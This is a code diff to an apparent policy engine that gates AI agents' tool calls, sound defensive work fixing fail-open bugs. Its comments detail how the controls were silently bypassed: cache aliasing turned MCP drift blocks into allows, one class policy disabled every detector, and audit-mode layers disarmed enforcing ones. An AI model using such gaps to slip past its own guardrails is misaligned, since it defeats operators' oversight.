+        from the front would not fix it either, because an MCP tool name legitimately contains a colon.
+        """
+        payload = json.dumps(event.tool_params, sort_keys=True, separators=(",", ":"))
+        return hashlib.sha256(payload.encode("utf-8")).hexdigest()[:16]
+
     def _cache_tool_key(self, event: "ToolCallEvent") -> str:
         """Build the eval-cache key suffix from EVERY decision-relevant input dimension, not just tool +
         params. SECURITY (cache-key-scope, fail-open): the 5s eval cache keys on (namespace, agent_class,
@@ -891,12 +1843,32 @@ class OPAEvaluator:
         here: `call_depth` (drives the chain_depth_limit / OWASP-LLM08 anti-recursion block — a shallow-depth
         allow must NOT shadow a deep-depth block) and `workload` (workload-tier `deployment:` policies — one
         workload's decision must NOT bleed to another sharing tool+params). Include them so the cached
-        decision is only ever served for an identical decision input."""
-        payload = json.dumps(event.tool_params, sort_keys=True, separators=(",", ":"))
-        digest = hashlib.sha256(payload.encode("utf-8")).hexdigest()[:16]
+        decision is only ever served for an identical decision input.
+
+        `mcp` is the third such input, and it was omitted for the same reason the first two were: it
+        became decision-relevant after this key was written. `_build_input` publishes the whole document
+        as `input.mcp` and lifts `input.direction` from it, so a policy can gate on `pin_status`,
+        `scan_severity`, `schema_enforced` or `surface`. Without it, two calls with identical
+        tool+params but different MCP context — the SAME tool once `pinned` and once in `drift`, or a
+        `tools/call` and a `resources/read` — alias inside the 5s TTL, and the second is served the
+        first's decision. That is a drift block silently downgraded to an allow.
+
+        The WHOLE document is hashed, not a hand-picked subset. A subset would have to be kept in step
+        with `_mcp_context` in the proxy forever, and the day someone adds a fact there without adding
+        it here the bypass returns silently — two components keyed differently on one concept, which is
+        the failure this key already exists to prevent. Every field in that document is derived at
+        DISCOVERY and stable per (tool, catalog state), so hashing all of it costs no hit rate. The term
+        is omitted entirely when there is no MCP context, so non-MCP traffic keeps its existing key and
+        does not churn: absent and `{}` are the same decision input (`input.mcp == {}` either way)."""
+        digest = self._params_digest(event)
         workload = getattr(event.agent_identity, "workload", "") or ""
         depth = int(getattr(event, "call_depth", 0) or 0)
-        return f"{event.tool_name}:{digest}:d{depth}:w{workload}"
+        key = f"{event.tool_name}:{digest}:d{depth}:w{workload}"
+        mcp = getattr(event, "mcp", None) or {}
+        if mcp:
+            blob = json.dumps(mcp, sort_keys=True, separators=(",", ":"), default=str)
+            key = f"{key}:m{hashlib.sha256(blob.encode('utf-8')).hexdigest()[:16]}"
+        return key
 
     def _extract_package_name(self, rego_source: str) -> str | None:
         """Extract package name from Rego source header."""
@@ -963,16 +1935,42 @@ class OPAEvaluator:
             except Exception:  # noqa: BLE001 — best-effort cleanup; OPA over-writes by module_id anyway
                 pass
 
+    async def _ensure_module_pushed(self, key: str, rego: str) -> None:
+        """Push (or re-push) `key`'s module when its digest changed; a no-op once OPA already has it.
+
+        Split out of _evaluate_opa_server so the caller can warm the module OUTSIDE the per-call
+        evaluation deadline. Compiling a module is a one-time CONTROL-plane cost, and charging it to a
+        DATA-plane deadline made the first call after every policy change a fail-closed
+        `evaluator_timeout` block: OPA stops serving while it recompiles the store, the in-flight
+        evaluate blew the 2s budget, and one legitimate tool call was wrongly blocked per policy edit.
+        Digest-guarded and idempotent, so the call left in _evaluate_opa_server stays correct on its own
+        (the warm is an optimisation, never the only push).
+        """
+        if settings.opa_mode != "server":
+            return
+        digest = hashlib.sha256(rego.encode("utf-8")).hexdigest()
+        if self._pushed.get(key) == digest:
+            return
+        await self.opa.push_policy(sanitize_key(key), rewrite_package(rego, managed_package(key)))
+        self._pushed[key] = digest
+        if key.startswith("dryrun:"):
+            await self._track_dryrun_module(key)
+
+    async def _warm_module(self, key: str, rego: str) -> None:
+        """Best-effort pre-deadline warm. Never raises: a failure here just leaves the push to the
+        evaluation path (which still pushes, retries once, and fails closed if genuinely broken), so
+        warming can only improve the outcome, never degrade it."""
+        try:
+            await asyncio.wait_for(self._ensure_module_pushed(key, rego), timeout=_MODULE_WARM_TIMEOUT_S)
+        except Exception as exc:  # noqa: BLE001 — best-effort; the eval path re-pushes and owns the verdict
+            log.warning("nrvq.opa.warm_failed", key=key, error=str(exc), code="NRVQ-ENG-2063")
+
     async def _evaluate_opa_server(self, key: str, rego: str, opa_input: dict) -> dict:
         """Evaluate against the long-lived OPA server; push (or re-push) the module as needed."""
         package = managed_package(key)
         module_id = sanitize_key(key)
         digest = hashlib.sha256(rego.encode("utf-8")).hexdigest()
-        if self._pushed.get(key) != digest:
-            await self.opa.push_policy(module_id, rewrite_package(rego, package))
-            self._pushed[key] = digest
-            if key.startswith("dryrun:"):
-                await self._track_dryrun_module(key)
+        await self._ensure_module_pushed(key, rego)
         result = await self.opa.query(package, opa_input)
         if result is None:
             # OPA lost in-memory state (sidecar restart) — re-push this module once and retry.
@@ -1186,7 +2184,73 @@ class OPAEvaluator:
                 candidates.append({"key": key, "rego": loaded["rego"], "priority": loaded["priority"],
                                    "enforcement_mode": loaded.get("enforcement_mode", "block")})
 
+        async def _append_controls_floor(target_namespace: str, scope: str = "__controls__") -> None:
+            """A reserved-scope module, tagged as a tighten-only overlay so it acts as a FLOOR.
+
+            Same lookup as `_append_policy` (in-memory first, then the DB), but tagged `overlay: True` at
+            CONSTRUCTION — which is the only source of overlay-ness the resolver trusts. The key is a fixed
+            reserved literal, so unlike the string-suffix heuristic there is no way a real agent class can
+            collide with it.
+
+            Parameterised by scope rather than copied per reserved module. `__egress__` (the compiled
+            destination allowlist, C2-013) needs byte-identical treatment to `__controls__`, and this
+            codebase has repeatedly shipped a fix into one of two copies — the shell pattern lists, the
+            MCP allow-check, the preset pair. One appender, two call sites.
+
+            Landing in the HARD partition needs no extra work: `_resolve_overlay` partitions the PACK
+            family by key suffix and treats EVERYTHING ELSE as hard, so a `__pack_weaken__` can never
+            relax either of these.
+            """
+            key = f"{target_namespace}:{scope}"
+            entry = self._loader._policies.get(key) or await self._loader.load_from_db(
+                target_namespace, scope
+            )
+            if entry:
+                candidates.append(
+                    {
+                        "key": key,
+                        "rego": entry["rego"],
+                        "priority": entry["priority"],
+                        "enforcement_mode": entry.get("enforcement_mode", "block"),
+                        "overlay": True,
+                    }
+                )
+
         await _append_policy(namespace, agent_class)
+        # The customer's tuned baseline CONTROLS, kept on their own key rather than sharing
+        # `__baseline__` with the chart's cluster guard.
+        #
+        # Both used to write `<ns>:__baseline__`. The chart's NrvqPolicy CR is reconciled by the
+        # webhook controller, so a `helm upgrade` — or any CR resync — silently reverted every control
+        # a customer had tuned, and the two writers produced different `enforcement_mode` values on the
+        # same key, which made the SAME probe return a prefixed rule_id on one run and a bare one on
+        # the next. Non-reproducible enforcement is worse than either behaviour on its own.
+        #
+        # Collected as a tighten-only FLOOR, not a base tier.
+        #
+        # It was a base tier, and base tiers resolve by highest priority OUTRIGHT — so an agent-class
+        # policy authored at 100 beat the controls tier at 2 and its decision was DISCARDED. Measured on
+        # a live cluster with `pii_detection` set to Enforce and one SSN payload:
+        #
+        #     r2-support    (has a class policy)   allow   cde_default_allow
+        #     anything-else (no class policy)      block   pii_detection
+        #
+        # Writing a single class policy silently switched all fourteen shipped detectors off for that
+        # class, while Target Settings still read "1 enforcing" — truthfully, about a control that no
+        # longer applied to the class the operator cared most about. A detector an operator explicitly
+        # promoted to Enforce must not be removable as a side effect of authoring an unrelated policy.
+        #
+        # As an overlay it is tighten-only (`_resolve_with_packs` takes it only when it is STRICTER than
+        # the base winner), and it lands in the HARD partition of `_resolve_overlay` — so a
+        # `__pack_weaken__` can never relax it either. Priority becomes irrelevant, which is what "floor"
+        # means. Note this also restores MONITORING on classes that have their own policy: `audit` is
+        # stricter than `allow`, and audit never interrupts a call, so the record comes back with no
+        # availability cost.
+        await _append_controls_floor(namespace)
+        # The compiled egress allowlist (C2-013). A tighten-only overlay for the same reason the
+        # controls floor is one: a per-class policy at a higher priority must not be able to discard
+        # the operator's destination rules, which is exactly what C2-008 was.
+        await _append_controls_floor(namespace, "__egress__")
         await _append_policy(namespace, "__baseline__")
         await _append_policy("__cluster__", "__baseline__")
         # The catalog advertises WORKLOAD and NAMESPACE tiers (resolve_policy_key mints
@@ -1292,8 +2356,26 @@ class OPAEvaluator:
             candidates.append({"key": key, "rego": entry["rego"], "priority": entry["priority"], "overlay": True})
             seen.add(key)
 
+        def _append_controls_overlay(ns: str, scope: str = "__controls__") -> None:
+            key = f"{ns}:{scope}"
+            if key in self._loader._policies and key not in seen:
+                entry = self._loader._policies[key]
+                candidates.append({"key": key, "rego": entry["rego"], "priority": entry["priority"],
+                                   "enforcement_mode": entry.get("enforcement_mode", "block"), "overlay": True})
+                seen.add(key)
+
         for ns in await self._loader.namespaces_for_class(agent_class):
             await _append_policy(ns, agent_class)
+            # Mirror the concrete-namespace collection. Omitting it here would make the console's
+            # global "All namespaces" picker report a different winning layer than the one a real
+            # agent actually gets — a tuned control would be invisible in exactly the view an operator
+            # uses to check their tuning took effect.
+            # Tighten-only FLOOR here too — see _collect_candidates. If the union path left this a base
+            # tier, the console's "All namespaces" view would report a different winning layer than the
+            # one a real agent actually gets, which is precisely the view an operator uses to check that
+            # their tuning took effect.
+            _append_controls_overlay(ns)
+            _append_controls_overlay(ns, "__egress__")
             await _append_policy(ns, "__baseline__")
             for overlay in ("__pack__", "__guardrail__", "__pack_override__", "__pack_weaken__"):
                 _append_overlay(f"{ns}:{overlay}")
@@ -1316,7 +2398,6 @@ class OPAEvaluator:
         construction (_collect_candidates/_collect_candidates_union), never re-derived from the key string. A
         real agent_class whose own base policy happens to end in a reserved suffix (e.g. "...__remediation__")
         is therefore never misclassified as an overlay and always keeps its priority-based precedence."""
-        rank = {"block": 0, "escalate": 1, "audit": 2, "allow": 3}
         overlay = [r for r in results if r.get("overlay")]
         base = [r for r in results if not r.get("overlay")]
         base_winner = self._resolve_precedence(base) if base else None
@@ -1325,9 +2406,27 @@ class OPAEvaluator:
             return overlay_winner
         if overlay_winner is None:
             return base_winner
-        overlay_rank = rank.get(overlay_winner["decision"].decision, 3)
-        base_rank = rank.get(base_winner["decision"].decision, 3)
-        return overlay_winner if overlay_rank < base_rank else base_winner
+        # Compare EFFECTIVE decisions, not raw ones. A `block` from a policy saved in audit mode is
+        # softened to `audit` moments later by `_apply_policy_mode`, so treating it as a block here
+        # makes two layers look equally strict when only one of them will actually stop the call — and
+        # a tie returns the BASE. Measured the moment the controls tier became a floor: the chart's
+        # `__baseline__` (audit mode) and the controls floor (block mode) both said block, the tie handed
+        # attribution to the baseline, and a control the operator had set to Enforce came back as
+        # `policy_audit_would_block:` — enforcement silently lost to a tiebreak.
+        return overlay_winner if self._effective_rank(overlay_winner) < self._effective_rank(base_winner) else base_winner
+
+    @staticmethod
+    def _effective_rank(item: dict) -> int:
+        """Restrictiveness AFTER the policy's own enforcement mode is taken into account.
+
+        `_apply_policy_mode` turns a block/escalate from an `audit`-mode policy into an `audit`, so that
+        is what the layer is really worth when two layers are compared.
+        """
+        rank = {"block": 0, "escalate": 1, "audit": 2, "allow": 3}
+        decision = str(item["decision"].decision)
+        if str(item.get("enforcement_mode", "block")) == "audit" and decision in ("block", "escalate"):
+            decision = "audit"
+        return rank.get(decision, 3)
 
     @staticmethod
     def _is_overlay(key: str) -> bool:
@@ -1395,15 +2494,44 @@ class OPAEvaluator:
         return results[0]
 
     def _resolve_precedence(self, results: list[dict]) -> dict:
-        """Highest priority wins; most restrictive wins on ties."""
+        """Highest priority wins among ENFORCING layers; an audit-mode layer can only tighten.
+
+        Priority still decides, and deliberately so: a per-class allowlist authored at 200 is meant to
+        loosen a baseline at 1, and "most restrictive wins" across base tiers would take that away.
+
+        What it must NOT do is let a policy saved in `audit` mode DISARM one that enforces. An
+        audit-mode policy is not making an enforcement decision — it is observing, and
+        `_apply_policy_mode` softens its block to an audit moments later. Ranked by priority alongside
+        real decisions it won anyway, and the lower-priority policy that would actually have blocked
+        was discarded: trialling a rule the documented safe way switched enforcement off. That is
+        BUG-014, and it is the same shape as the base-vs-floor tie fixed alongside it — the engine was
+        reasoning about effective decisions in one place and raw decisions in the other.
+
+        So audit-mode layers are partitioned out and re-applied as tighten-only observers, exactly like
+        an overlay: they can raise an `allow` to `audit` (recording without interrupting, which is what
+        monitor mode is for) and can never lower a `block`.
+        """
         decision_rank = {"block": 0, "escalate": 1, "audit": 2, "allow": 3}
-        results.sort(
-            key=lambda item: (
-                -int(item["priority"]),
-                decision_rank.get(item["decision"].decision, 3),
+
+        def by_priority(items: list[dict]) -> dict:
+            items.sort(
+                key=lambda item: (
+                    -int(item["priority"]),
+                    decision_rank.get(item["decision"].decision, 3),
+                )
             )
-        )
-        return results[0]
+            return items[0]
+
+        observing = [r for r in results if str(r.get("enforcement_mode", "block")) == "audit"]
+        enforcing = [r for r in results if str(r.get("enforcement_mode", "block")) != "audit"]
+        # Nothing enforcing: the observation IS the decision, and still gets softened downstream.
+        if not enforcing:
+            return by_priority(results)
+        winner = by_priority(enforcing)
+        if not observing:
+            return winner
+        observer = by_priority(observing)
+        return observer if self._effective_rank(observer) < self._effective_rank(winner) else winner
 
     def _fallback_decision(self, event: ToolCallEvent, elapsed_ms: float) -> PolicyDecision:
         """Return fail-closed fallback decision when evaluation fails."""
